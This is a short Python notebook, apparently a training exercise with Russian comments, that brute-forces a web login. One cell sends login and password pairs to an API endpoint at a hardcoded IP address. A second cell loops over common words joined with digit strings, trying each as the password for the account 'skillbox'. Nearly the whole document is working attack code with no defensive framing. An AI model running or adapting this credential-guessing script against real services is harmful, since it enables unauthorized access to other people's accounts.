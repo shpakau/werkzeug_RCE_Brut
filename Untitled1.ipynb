{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyNlRz0ke4b7qITVCgscSvOK"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "faAZzc4DwKJb"
      },
      "outputs": [],
      "source": [
        "import requests\n",
        "\n",
        "def try_password(login, password):\n",
        "    URL = \"http://35.189.64.53/api/login-with-password\"\n",
        "    payload = {\"login\": login,  \"password\": password}\n",
        "\n",
        "    response = requests.post(URL, payload)\n",
        "    if response.status_code != 200:\n",
        "        print(f\"Wrong status code: {response.status_code}\")\n",
        "\n",
        "    # Проверить что 'Content-Type': 'application/json' \n",
        "\n",
        "    data = response.json()\n",
        "    if data[\"result\"]:\n",
        "        print(\"Correct login/passwrod\")\n",
        "        return True\n",
        "    else:\n",
        "        print(\"Wrong login/password\")\n",
        "        return False"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "login = \"skillbox\"\n",
        "\n",
        "# длинна = 8 \n",
        "# символы = a-z0-9\n",
        "# слово + символ\n",
        "\n",
        "words = [\"admin\", \"password\", \"root\", \"mike\"]\n",
        "digits = [\"1234\", \"0000\", \"9999\", \"2023\"]\n",
        "\n",
        "for word in words:\n",
        "    for digit in digits:\n",
        "        candidate = word + digit\n",
        "        print(f\"candidate {candidate}\")\n",
        "        try_password(login, candidate)\n"
      ],
      "metadata": {
        "id": "CDOPr4CjznkX"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "ZYHSmK5A2Zks"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [],
      "metadata": {
        "id": "kCNUtbZC2WxO"
      }
    }
  ]
}